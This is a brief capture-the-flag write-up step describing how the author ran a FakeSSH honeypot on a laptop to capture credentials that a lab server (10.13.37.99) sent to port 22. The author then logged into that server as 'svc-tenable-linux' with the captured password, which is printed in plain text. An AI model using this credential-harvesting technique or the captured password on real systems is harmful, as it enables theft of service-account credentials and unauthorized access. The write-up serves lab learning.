It was not about attacking, but listening on the laptop.
There was a connection to port 22 from the server 10.13.37.99
Let's install a FakeSSH serveur :
git clone https://github.com/tylermenezes/FakeSSH

sudo pip install paramiko

cd FakeSSH
cp ./data/config.sample.json ./data/config.json
ssh-keygen -f ./data/rsa -m 'PEM' 
set no password

sudo python3 server.py

wait max 10min

![](https://github.com/k4nfr3/CTF-writeup/blob/master/Fakessh_1.jpg)

ssh -l svc-tenable-linux 10.13.37.99
password = $\mx3i#u0@%6d@8fk^&^x*ntw2m

![](https://github.com/k4nfr3/CTF-writeup/blob/master/Fakessh_2.jpg)
